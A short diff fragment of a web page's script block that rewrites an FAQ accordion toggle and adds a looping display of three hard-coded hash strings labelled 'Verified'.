-      item.classList.toggle('open');
-      const a = item.querySelector('.faq-a');
-      a.style.maxHeight = item.classList.contains('open') ? a.scrollHeight + 'px' : null;
-    });
+  // UI
+  const track = document.getElementById('ledgerTrack');
+  const items = ['0x7a3f…9c21', '0x1b8e…77aa', '0x5d21…f302'].map(h => `<div class="entry"><span>${h}</span><span class="tag ok">Verified</span></div>`).join('');
+  track.innerHTML = items + items;
+
+  document.querySelectorAll('.faq-item').forEach(i => {
+    i.querySelector('.faq-q').onclick = () => {
+      const a = i.querySelector('.faq-a');
+      a.style.maxHeight = a.style.maxHeight ? null : a.scrollHeight + 'px';
+    };
   });
 </script>
 </body>
